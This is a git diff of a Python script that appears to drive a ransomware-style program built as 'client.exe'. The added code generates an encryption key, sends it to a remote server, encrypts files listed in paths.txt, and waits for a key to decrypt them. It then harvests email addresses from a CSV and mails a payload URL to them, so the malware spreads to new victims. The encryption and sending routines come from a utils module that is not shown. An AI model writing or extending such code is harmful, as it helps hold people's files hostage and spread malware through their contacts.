@@ -17,76 +17,44 @@ how the pipeline works (when you run the client.exe file):
     key input in order to decrypt the files back. "Enter Key to decrypt" [Pending] <----------------
 15. After the key is entered, the files will be decrypted and the prompt will close [Pending] <----------------
 """
-from utils import *
-
+from utils import waitingForKey, generate_key, findTxtFileAndSaveThemTo, encrypt_ascii_key_with_server_RSA_and_send_to_server, encrypt_file_paths, saveKey, decrypt_file_paths, get_emails_from_csv, send_to_emails
 
 # Continue with the rest of your program logic
 waitingForKey("start")
 
-
-
 #1
-ascii_key= "vG7pyhyrDzSnqcJ8"
-#generate_key(16)
+# ascii_key= "vG7pyhyrDzSnqcJ8"
+ascii_key = generate_key(16)
+print("ascii_key vvvv" + ascii_key)
 
 #2
 file_contains_paths ="paths.txt"
-findTxtFile( file_contains_paths )
-
-#9
-encoded_encrypted_msg = send_to_server(ascii_key)
+findTxtFileAndSaveThemTo( file_contains_paths )
 
 #3
+encoded_encrypted_msg, credentials, payload_url = encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key)
+print("credentials" + str(credentials))
+print("payload_url" + str(payload_url))
+#4
 encrypt_file_paths(ascii_key, file_contains_paths)
 
-#4
+#5
 saveKey(ascii_key, "Key.key")
 
-#5
+#6
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
 
-#9
+#7
 waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
 decrypt_file_paths(ascii_key, file_contains_paths)
 
-
-print("Press Enter To Close...")
-input()
-
-
-'''
-#3
-encrypt_file_paths(ascii_key, file_contains_paths)
-
-#4
-saveKey(ascii_key, "Key.key")
+# 8
+emails = get_emails_from_csv()
 
 
 
-#6
-key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
-saveKey(key_pair, "keyPair.key")
-
-
-
-#8
-saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
-
-#9
-waitingForKey(ascii_key, message="Enter the secret key to DECRYPT FILES: ")
-encrypt_file_paths(ascii_key, file_contains_paths)
-
-#9
-#send_to_server(encoded_encrypted_msg)
-
-#10
-#emails = get_emails_from_csv()
-
-#11 
-# convert_to_exe()
-
-#12
-# send_to_emails(emails)
-
-#13
-'''
+print(emails)
+# 9
+send_to_emails(emails, credentials, payload_url)
+print("Payload was sent successfully!")
+input("Press Any Key To Close...")
